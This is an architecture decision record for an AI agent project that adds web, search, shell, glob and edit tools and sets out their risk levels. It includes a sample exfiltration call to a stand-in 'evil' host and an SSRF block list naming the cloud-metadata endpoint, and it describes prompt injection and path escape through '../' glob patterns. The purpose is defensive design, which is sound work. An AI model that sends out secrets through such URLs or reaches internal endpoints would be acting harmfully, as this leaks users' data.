# ADR 0004 — Capable agent tools: web, shell, search, edit (network tools are medium-risk)

- **Status:** Accepted
- **Date:** 2026-07-25
- **Deciders:** @zq940222
- **Related:** [P14 — #39](https://github.com/zq940222/super-agent/issues/39), `docs/agent-research.md` (§4 checklist #4 "few sharp tools + code execution", #3 output-size discipline, §OpenClaw tool surface), [ADR-0003](0003-web-ui.md)

## Context

The agent can chat, read/list/write files, spawn subagents, and use skills — but it can't
**run commands, search, look things up on the web, or edit files surgically.** Against the
tool surface of OpenClaw / Codex (grounded from their real docs/source), that's the main
capability gap: `exec`/`terminal`, `web_search`/`web_fetch`, `edit`/`apply_patch`, browser.
The research is blunt that "few sharp tools + code execution" is the single biggest lever.

This ADR records the **direction** and the **cross-cutting decisions** for the arc, so each
tool doesn't re-litigate them. Sequence (small, ADR-covered, tested phases):
**web_fetch → web_search → shell/exec → grep/glob → edit_file/apply_patch.**

## Decision

### 1. Direction: add the "capable tool" set, not messaging/channels

We pursue the *capability core* (the tools above), not OpenClaw's *personal-assistant
platform* (25+ messaging channels, autonomous heartbeat, voice) — the latter is a separate,
much larger product arc. An assistant with no `exec`/web/edit isn't powerful regardless of
channels, so capability comes first.

### 2. Network tools are **medium-risk**, not low

`web_fetch` (and later `web_search`, and any outbound tool) is `medium` risk, `mutates: false`.
Reasoning is the lethal trifecta the project already commits to: a network fetch is both the
**inbound** leg (fetched content is untrusted — the #1 tool-agent vuln, prompt injection) and
the **outbound** leg (an attacker-chosen URL is an exfil channel: `web_fetch("http://evil/?d=<secrets>")`).

Consequences of `medium` (vs `low`): under the default policy it **asks once** before the
first fetch (the web UI's "Always allow" makes repeats ~one click), and **`readonly` mode
denies it** — a read-only session can't reach the network. That's the correct posture; we
don't spend it to save one click.

### 3. SSRF guard at the tool boundary (cheap now, not a later track)

`web_fetch` refuses:
- non-`http(s)` schemes (`file:`, `data:`, `gopher:`, …), and
- loopback / link-local / private hosts by literal: `localhost`, `127.0.0.0/8`, `::1`,
  `169.254.0.0/16` (incl. the `169.254.169.254` cloud-metadata endpoint), `10/8`,
  `172.16/12`, `192.168/16`, `0.0.0.0`.

This matters *in this repo*: the web UI serves an authenticated agent on `127.0.0.1:8787`, so
an unguarded `web_fetch` is a same-machine path to it. **Redirects are followed manually and
re-checked at every hop** (a `302` to `169.254.169.254` would otherwise bypass a first-hop-only
check). Full DNS-rebinding defence (a hostname that *resolves* to a blocked IP) needs resolution
and is deferred; the literal + per-hop check is cheap and unit-testable with zero network.

### 3a. `web_search`: Brave, check-gated on a key (P14-2)

`web_search` uses the **Brave Search API** (`GET res/v1/web/search`, `X-Subscription-Token`
header, `web.results[].{title,url,description}`). Chosen over Google/Bing/SerpAPI for a real
free tier and a single-key, no-OAuth setup that fits the from-scratch ethos; the `fetch` seam
is injectable so a different backend (Tavily, …) can be added later as an adapter without
touching callers.

It's **check-gated** (Hermes' "unconfigured tools don't appear"): `createWebSearchTool()` reads
`BRAVE_API_KEY`, and `check()` returns false when it's absent, so an unconfigured `web_search`
is never offered to the model — better than surfacing a tool that only errors at call time.
Brave `description` snippets carry highlight markup (`<strong>…`), so we strip tags and cap each
snippet (output-size discipline, §4). No SSRF guard is needed: the endpoint is fixed, not
model-chosen (unlike `web_fetch`). Same `medium`-risk posture as `web_fetch` (§2).

### 3b. Search tools guard the glob *pattern* separately from the path (P14-4)

`glob`/`grep` are `low`-risk read-only tools, but they surfaced a new boundary rule.
The per-path `resolveInWorkspace` guard bounds the `path` argument — but a glob *pattern*
is matched relative to that base, and Bun's `Glob.scan` honors `..`, so `../*.txt` reads
sibling files *even when a `workspaceRoot` is set*. So the search tools reject an escaping
pattern (`..` segment or absolute) up front via `unsafeGlobPattern`, in addition to the
path guard. This is the same "the boundary must be checked where the escape actually
happens" lesson as the SSRF per-hop redirect check (§3) — recorded here so future
file-enumerating tools apply it.

### 4. Tool-output size discipline (research checklist #3)

Tool output is what fills the context window. Every tool that can return a lot (fetched pages
now; shell/grep later) caps its output and appends a **visible** marker —
`…[truncated N of M chars]` — so the model knows it didn't see the whole thing (silent
truncation makes it believe it did).

### 5. Untrusted-output neutralization is deferred (noted, not silent)

Scanning/neutralizing injection *content* in tool output (research checklist #10) is a distinct
security-hardening arc. For now the mitigations are structural: `medium`-risk gating (a human
sees the fetch), the SSRF boundary, and the workspace/permission model. Tool descriptions note
the output is untrusted best-effort text.

## Consequences

**Positive**
- A real capability jump toward OpenClaw/Codex, one small tool at a time, each gated and tested.
- Network tools inherit the existing permission model correctly (medium ⇒ ask/deny), no engine change.
- The SSRF + truncation decisions are made once here, so per-tool phases stay small.

**Negative / accepted**
- `medium`-risk web tools prompt on first use (mitigated by "Always allow").
- HTML→text is hand-rolled best-effort (no readability dep) — messy on some pages; acceptable v1.
- No content-level injection scanning yet, and no DNS-rebinding defence — both explicitly deferred.

## Alternatives considered

- **Low-risk web tools** (run with no prompt, allowed in readonly). Rejected: breaks the
  lethal-trifecta posture — a readonly session could exfiltrate, and every fetch would be
  unattended inbound-injection surface.
- **Bundle web_fetch + web_search in one phase.** Rejected: `web_fetch` needs no key/vendor and
  is independently valuable; `web_search` forces a vendor + key decision that deserves its own phase.
- **A readability/HTML-parsing dependency.** Rejected for v1 on the from-scratch/minimal-deps ethos;
  revisit if hand-rolled extraction proves too noisy.
